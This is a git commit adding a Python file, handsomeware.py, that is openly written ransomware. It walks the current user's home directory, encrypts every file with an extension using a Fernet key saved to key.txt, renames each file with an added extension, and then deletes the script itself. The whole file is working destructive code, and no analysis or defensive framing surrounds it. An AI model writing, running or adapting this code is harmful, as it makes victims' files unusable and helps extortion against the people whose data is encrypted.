9a13119a7c20fa16b4c58e0227cf4008fd4ae15b
IamSeckion <109115387+IamSeckion@users.noreply.github.com>
2022-08-13 19:20:30 +0100

    Create handsomeware.py

---
+++ handsomeware.py
@@ -0,0 +1,46 @@
+import os
+from pathlib import Path
+from cryptography.fernet import Fernet
+
+class Handsomeware:
+    def __init__(self) -> None:
+        self.home_dir = str(Path.home())
+    
+    def key(self):
+        self.key = Fernet.generate_key()
+
+        with open('key.txt','wb') as file:
+            file.write(self.key)
+
+    def encrypt_files(self,file):
+        fernet = Fernet(self.key)
+
+        with open(file,'rb')as file_read:
+            data =  file_read.read()
+            file_read.close()
+
+        with open(file,'wb') as file_write:
+            encrypted_content = fernet.encrypt(data)
+            file_write.write(encrypted_content)
+            file_read.close()
+
+    def change_extension(self,file,new_extension):
+        extension = file.split('.')[-1]
+        new_extension = f"{new_extension}."+extension
+        new_name = file.replace(extension,new_extension)
+        os.rename(file,new_name)
+
+    def start(self,extension):
+        for rootdir, dirs, files in os.walk(self.home_dir):
+            for subdir in dirs:
+                dir = os.path.join(rootdir, subdir)
+                try:
+                    os.chdir(dir)
+                    for files in os.listdir(dir):
+                            if os.path.isfile(files) == True:
+                                if "." in files:
+                                    self.encrypt_files(files)
+                                    self.change_extension(files,extension)
+                except:
+                    continue        
+        os.remove(os.path.basename(__file__))        
